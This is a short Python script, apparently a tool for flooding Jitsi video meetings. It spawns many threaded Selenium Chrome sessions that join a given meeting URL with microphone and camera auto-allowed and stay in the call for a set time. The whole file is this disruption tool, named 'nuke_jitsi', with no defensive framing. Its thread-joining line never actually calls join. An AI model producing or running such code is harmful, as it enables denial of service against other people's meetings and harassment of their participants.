import os
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import chromedriver_autoinstaller
from time import sleep
import threading

chromedriver_autoinstaller.install()

def nuke_jitsi(url: str, minutes=60):
    opt = Options()
    opt.add_experimental_option("prefs", { \
        "profile.default_content_setting_values.media_stream_mic": 1, 
        "profile.default_content_setting_values.media_stream_camera": 1,
    })
    driver = webdriver.Chrome(chrome_options=opt)
    driver.get(url)
    sleep(minutes * 60)
    driver.close()

def main():
    INSTANCE_NUM = int(os.getenv('INSTANCE_NUM'))
    LENGTH = int(os.getenv('LENGTH'))
    URL = os.getenv('URL')
    l_thr = []
    for i in range(INSTANCE_NUM):
        thr = threading.Thread(target=nuke_jitsi, args=(URL, LENGTH))
        thr.start()
        l_thr.append(thr)
    [thr.join for thr in l_thr]

if __name__ == '__main__':
    main()
